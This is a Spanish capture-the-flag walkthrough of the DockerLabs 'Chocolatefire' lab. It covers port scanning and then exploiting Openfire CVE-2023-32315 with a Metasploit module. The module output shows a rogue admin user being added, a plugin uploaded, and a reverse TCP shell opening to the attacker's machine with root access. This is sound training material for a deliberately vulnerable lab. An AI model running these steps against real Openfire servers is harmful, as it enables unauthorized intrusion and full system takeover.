---
icon: flag
---

# Chocolatefire DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip chocolatefire.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh chocolatefire.tar
```

Info:

```
                           ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 12:33 EDT
Nmap scan report for asucar.dl (172.17.0.2)
Host is up (0.0000080s latency).

PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:7c:e5:ea:fe:ac:f5:bc:21:54:87:66:70:ed:df:75 (RSA)
|   256 b2:1a:b1:05:0e:7e:94:18:98:19:8f:60:d7:04:7a:1c (ECDSA)
|_  256 c1:81:ba:4f:1a:99:9f:32:10:4a:6a:d9:f4:aa:40:de (ED25519)
5222/tcp open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     features: 
|_    stream_id: 5a9nobfmyx
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5223/tcp open  ssl/hpvirtgrp?
|_ssl-date: TLS randomness does not represent time
5262/tcp open  jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     features: 
|_    stream_id: 885m3zb6ey
5263/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
5269/tcp open  xmpp           Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       host-unknown
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     features: 
|_    stream_id: 4bh6bt4vci
5270/tcp open  xmp?
5275/tcp open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     features: 
|_    stream_id: a02uv7nynz
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
7070/tcp open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 16:33:41 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:03 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 16:33:46 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp open  socks5         (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 16:33:41 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:03 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 16:33:46 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3A1F9%P=x86_64-pc-linux-gnu%r(
SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
SF:ams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3A1F9%P=x86_64-pc-linux-gnu%r(
SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
SF:ams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3A1E5%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x2
SF:02024\x2016:33:41\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x202022
SF:\x2015:55:03\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20
SF:bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Ope
SF:nfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><font
SF:\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://www
SF:\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service<
SF:/b></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Un
SF:known\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,"
SF:HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x202024\x2016:33:4
SF:6\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\x
SF:20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:\
SF:x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x
SF:20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1\
SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20characte
SF:r\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Ill
SF:egal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso
SF:-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad
SF:\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0
SF:</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</p
SF:re>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20C
SF:NTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Le
SF:ngth:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h
SF:1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3A1E5%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x2
SF:02024\x2016:33:41\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x202022
SF:\x2015:55:03\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20
SF:bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<
SF:meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head
SF:>\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ill
SF:egal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso
SF:-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad
SF:\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0
SF:</pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20C
SF:NTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Len
SF:gth:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1
SF:><pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das
SF:,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Ille
SF:gal\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\
SF:x20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\
SF:nContent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Messag
SF:e\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1
SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20charact
SF:er\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTT
SF:POptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x2020
SF:24\x2016:33:46\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.67 seconds
```

Por lo que vemos el unico puerto en el que hay una web abierta es en el `9090` por lo que iremos a ese puerto de la siguiente manera.

```
URL = http://<IP>:9090/
```

Veremos un panel de login, en el que nos dice debajo la version y el nombre del software, si probamos a buscar un exploit en metasploit veremos lo siguiente.

```shell
msfconsole -q
```

Buscamos algun exploit del software.

```shell
search openfire
```

Info:

```
Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/openfire_auth_bypass                     2008-11-10       excellent  Yes    Openfire Admin Console Authentication Bypass
   1  exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315  2023-05-26       excellent  Yes    Openfire authentication bypass with RCE plugin


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```

Y veremos 2, el que necesitamos seria el segundo con identificador 1 por lo que lo seleccionamos.

```shell
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```

Configuramos todo para que funcione.

```shell
set RHOSTS <IP>
set LHOST <YOUR_IP>
```

Ejecutamos el exploit.

```shell
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.145:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Openfire version is 4.7.4
[*] Grabbing the cookies.
[*] JSESSIONID=node01tfslosd0eap2wa2bpgji6cvj3.node0
[*] csrf=1jw0h5U3v6dObMF
[*] Adding a new admin user.
[*] Logging in with admin user "pkukmhgknaf" and password "okmvG8VAQv".
[*] Upload and execute plugin "cZIBLwaZ" with payload "java/shell/reverse_tcp".
[*] Sending stage (2952 bytes) to 172.17.0.2
[!] Plugin "cZIBLwaZ" need manually clean-up via Openfire Admin console.
[!] Admin user "pkukmhgknaf" need manually clean-up via Openfire Admin console.
[*] Command shell session 1 opened (192.168.5.145:4444 -> 172.17.0.2:54230) at 2024-08-07 12:41:54 -0400
```

Por lo que ya tendriamos una shell con la maquina victima.

```shell
/bin/bash -i
root@b923c577d1ea:~# whoami
root
```

Y veremos que somos `root` ya directamente, por lo que la habriamos completado.
